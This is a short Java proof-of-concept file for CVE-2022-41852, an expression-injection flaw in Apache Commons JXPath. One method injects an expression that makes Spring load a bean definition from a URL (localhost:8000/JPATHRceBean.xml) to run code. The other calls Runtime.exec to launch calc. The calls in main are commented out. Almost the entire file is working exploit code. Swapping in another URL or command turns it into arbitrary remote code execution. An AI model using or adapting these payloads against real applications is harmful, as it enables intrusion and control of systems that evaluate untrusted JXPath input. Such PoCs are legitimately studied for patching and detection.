package jxpath;

import org.apache.commons.jxpath.JXPathContext;

class Clzz {
    public Clzz(){

    }
}

public class CVE_2022_41852 {

    public static void poc1(){

        Clzz clzz = new Clzz();
        JXPathContext context = JXPathContext.newContext(clzz);
        String strVal = (String) context.getValue("org.springframework.context.support.FileSystemXmlApplicationContext.new('http://localhost:8000/JPATHRceBean.xml')");
    }

    public static void poc2(){

        JXPathContext context = JXPathContext.newContext(null);
        context.getValue("exec(java.lang.Runtime.getRuntime(),'calc')");
    }

    public static void main(String[] args) {
//        poc1();
//        poc2();
    }
}
